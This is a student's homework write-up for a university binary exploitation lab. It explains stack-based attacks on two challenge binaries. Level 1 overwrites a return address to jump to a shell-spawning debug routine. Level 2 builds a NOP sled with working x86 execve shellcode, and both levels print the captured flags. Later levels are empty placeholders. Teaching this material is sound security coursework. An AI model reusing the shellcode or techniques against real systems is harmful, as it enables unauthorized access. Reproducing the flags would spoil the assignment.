# README
# Part 2 - Binary Exploitation
## Author

name: Brian C. Morris

email: bcmorri3@ncsu.edu

Unity id: bcmorri3

## Level 1
### Vulnerability:
The input functionality of the program allows me to overwrite the base pointer of the program and return to a different subroutine (debug) after execution, which spawns a shell.
### Description:
When running be1 on the server, I saw that the program expected 2 input values. The first is the index of a value I am updating, the second is the value to change it to. By observing the binary be1 in IDA, I saw that the program uses these 3 instructions:
```
mov     eax, [ebp+index]
mov     edx, [ebp+value]
mov     [ebp+eax*4+array], edx
```
The value (2nd command line argument), is stored in edx, and then moved to ebp+eax\*4+array. By inputting a return address (08048543) of a different subroutine, and making sure my index is appropriately past the bounds of the array, in this case 11, I overwrite the base pointer of the subroutine, returning to the debug subroutine. The debug subroutine spawns a privelaged shell, allowing me to cat the flag.txt file. The following output shows the input I provided the program to retrieve the flag.
```
bcmorri3@binhw-trusty-2:~/BinaryExploit/Level1$ ./be1 11 08048543
Updating table value at index 11 with 134513987: previous value was -1219163405
The updated table is:
0: 2
1: 3
2: 5
3: 7
4: 11
5: 13
6: 17
$ ls
be1  flag.txt
$ cat flag.txt
flag{73e54c4a7e13c0b19b23acc3728aa26c}
$
```

## Level 2
### Vulnerability:
By observing the behavior of the stack, simple scripting can create a NOP-sled to slide into a shellcode that spawns a shell.
### Description:
Like the previous binary, this requires 2 inputs. By observing the code in IDA, I saw that index 11 would work again as it did previously. I first took advantage of GDB and a simple perl script to write a large number of NOP operations to the stack. I then used GDB to examine the memory around the stack pointer, to find the memory address of my NOP sled. The following commands were used to observe memory addresses.

```
[bcmorri3@engr-ras-201 Level2]$ gdb be2
GNU gdb (GDB) Red Hat Enterprise Linux 7.6.1-110.el7
Copyright (C) 2013 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-redhat-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /afs/unity.ncsu.edu/users/b/bcmorri3/CSC405/hw3/BinaryExploit/Level2/be2...done.
(gdb) break main
Breakpoint 1 at 0x8048519: file 2.c, line 20.
(gdb) r 11 `perl -e 'print "\x90"x200'`
(gdb) x/300x $esp
```

After scrolling through the rows of memory addresses, I found my NOP-sled at location bffff860, knowing that this location is where I will be writing my shellcode. I then updated my perl script to add in shellcode that I re-used from homework 2. Re-running the program (outside of GDB) yielded this output:

```
[bcmorri3@engr-ras-201 Level2]$ ./be2 11 `perl -e 'print "bffff860","\x90"x100,"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'`
Updating table value at index 11 with -1073743792: previous value was -1209804045
The updated table is:
0: 2
1: 3
2: 5
3: 7
4: 11
5: 13
6: 17
$ cat flag
cat: flag: No such file or directory
$ cat flag.txt
flag{601cc8bc0666ac68f3500a306e3f7c00}
```

## Level 3
### Vulnerability:
[insert vulnerability here]
### Description:
[insert description here]

## Level 4
### Vulnerability:
[insert vulnerability here]
### Description:
[insert description here]

## Level 5
### Vulnerability:
[insert vulnerability here]
### Description:
[insert description here]

## Level 6
### Vulnerability:
[insert vulnerability here]
### Description:
[insert description here]

## Level 7
### Vulnerability:
[insert vulnerability here]
### Description:
[insert description here]

## Level 8
### Vulnerability:
[insert vulnerability here]
### Description:
[insert description here]

## Level 9
### Vulnerability:
[insert vulnerability here]
### Description:
[insert description here]

## Level 10
### Vulnerability:
[insert vulnerability here]
### Description:
[insert description here]
